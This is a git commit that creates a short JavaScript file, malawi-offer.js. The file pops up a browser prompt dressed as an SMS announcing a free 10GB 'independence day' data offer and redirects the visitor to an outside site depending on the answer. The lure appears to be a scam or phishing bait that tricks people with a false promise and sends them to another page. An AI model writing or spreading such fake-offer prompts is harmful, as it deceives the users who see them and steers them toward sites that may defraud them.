98364bb2913af4f9f2cd5d743a79b309e3ee487b
boss-bloq <nsisboy01@gmail.com>
2024-07-02 02:26:56 -0700

    Create malawi-offer.js

---
+++ malawi-offer.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('SMS: Congratulations you have been selected to receive 10gb free data independence day offer, Kindly press 1 to proceed now','1');
+if (password != '1') {
+location.href='https://damba-fest.org/malawi-independence.html';
+}
